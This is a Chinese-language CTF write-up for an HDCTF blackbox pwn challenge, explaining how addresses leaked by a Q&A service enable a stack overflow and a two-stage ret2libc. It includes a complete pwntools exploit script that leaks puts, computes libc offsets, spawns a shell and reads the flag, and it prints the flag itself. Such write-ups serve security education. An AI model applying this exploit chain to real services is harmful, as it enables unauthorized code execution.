---
title: "异象pwn，泯除！：黑盒 ret2libc"
date: "2026-09-12"
categories: "Pwn"
tags: ["黑盒", "ret2libc", "栈对齐"]
excerpt: "从问答中获知关键地址，触发后续输入的栈溢出，泄漏 libc 后构造 ret2libc。"
slug: "hdctf-anomaly-ret2libc"
source_event: "HDCTF"
---

> 复现材料：`题目交互服务`。赛题附件未随文章打包。本文日期取自原始题解文件的修改日期。

没有附件，只有服务地址。连上去是异象管理局的问答台，菜单四项，问「异象空间的信息」「异象“播音机”的信息」这类完整短语才回话，其余一律“暂时无法回答”。匹配是精确相等，枚举 700 多个候选短语也没套出更多。

## 情报

三条有效短语给出的信息：

- 异象空间的信息：主入口 `0x40161a`，POPRDIRET `0x4011da`
- 异象“播音机”的信息：登记编号 70-75-74-73（ASCII 是 `puts`），PLT `0x401090`，GOT `0x404000`
- 异象“录音器”的信息：登记编号 72-65-61-64（ASCII 是 `read`），GOT `0x404018`

登记编号直接拼出函数名，地址是固定值，无 PIE，标准 ret2libc 布局。

## 漏洞

问题输入一次最多读 0x80 字节。塞满 128 字节后走另一分支，把剩余字节再读进一个 24 字节的栈缓冲，溢出点在这里。没有 canary，返回地址在偏移 24——`24B + p64(0x40161a)` 能直接重进主循环，验证过。

## 利用

第一段溢出：`pop rdi; puts(puts@got); main`，泄漏 puts 后回主循环。puts 低 12 位 `0x650`、read 低 12 位 `0x840`，libc.rip 命中 `libc6_2.35-0ubuntu3.11/12_amd64`，read 泄漏反推基址完全吻合：`puts +0x80e50`、`system +0x50d70`、`/bin/sh +0x1d8678`。

第二段溢出：`pop rdi; /bin/sh; ret; system`。踩了个坑：system 内部有 movaps，栈没对齐直接崩，在 system 前补一个裸 `ret`（`0x4011db`，就是 pop rdi; ret 的 ret 字节）解决。

```python
#!/usr/bin/env python3
# HDCTF pwn (no binary) - 异象管理局 Q&A service
# Recon from NPC: main=0x40161a, pop rdi;ret=0x4011da, puts@plt=0x401090,
#                 puts@got=0x404000, read@got=0x404018
# Vuln: question buffer read 0x80 bytes; when full, leftover is read into a
#       24-byte stack buffer -> overflow. No canary, ret at offset 24.
# Stage1: leak puts -> libc base (glibc 2.35-0ubuntu3.11/12 amd64)
# Stage2: system("/bin/sh") with stack-alignment ret
from pwn import *

context.log_level = "info"
context.timeout = 6
HOST, PORT = "challenge.example.invalid", 30095
PROMPT = b"\xe9\x89\xb4\xe5\xae\x9a\xe5\xb8\x88\xef\xbc\x9a"  # 鉴定师：

POP_RDI = 0x4011da
RET = 0x4011db                    # bare ret (0x4011da + 1)
PUTS_PLT = 0x401090
PUTS_GOT = 0x404000
MAIN = 0x40161a
OFF_PUTS = 0x80e50
OFF_SYSTEM = 0x50d70
OFF_BINSH = 0x1d8678


def overflow(tail: bytes) -> bytes:
    return b"A" * 128 + tail


def main():
    io = remote(HOST, PORT)
    io.recvuntil(PROMPT)

    # stage 1: leak puts, return to main
    tail1 = b"B" * 24 + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
    io.send(overflow(tail1))
    line = io.recvuntil(b"\n", timeout=3)
    puts = u64(line.strip().ljust(8, b"\x00"))
    libc = puts - OFF_PUTS
    system = libc + OFF_SYSTEM
    binsh = libc + OFF_BINSH
    log.info("libc=%#x system=%#x /bin/sh=%#x", libc, system, binsh)
    io.recvuntil(PROMPT, timeout=4)

    # stage 2: system("/bin/sh"), alignment ret before system
    tail2 = b"B" * 24 + p64(POP_RDI) + p64(binsh) + p64(RET) + p64(system)
    io.send(overflow(tail2))
    time.sleep(0.6)
    io.sendline(b"id; echo SHELL_OK; cat /flag; cat flag")
    print(io.recvall(timeout=6).decode(errors="replace"))
    io.close()


if __name__ == "__main__":
    main()
```

## Flag

```
HDCTF{408043fa-d058-290e-e36a-44b889e1f75d}
```

根因一句话：满 128 字节后的剩余输入没做长度校验直接落栈；黑盒场景下服务端把关键地址全报给了你，leak 加 ret2libc 一路走完。
